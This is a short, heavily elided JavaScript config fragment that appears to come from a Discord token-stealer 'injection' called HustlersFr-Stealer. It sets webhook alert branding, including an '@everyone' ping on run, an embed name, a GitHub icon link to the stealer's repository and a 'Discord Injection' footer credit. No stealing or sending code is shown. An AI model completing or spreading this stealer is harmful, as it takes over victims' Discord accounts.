...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'HustlersFr Injection', 
  embed_icon: 'https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By YoutubeMossy・https://github.com/YoutubeMossy',
        },
      },
    ],
  };
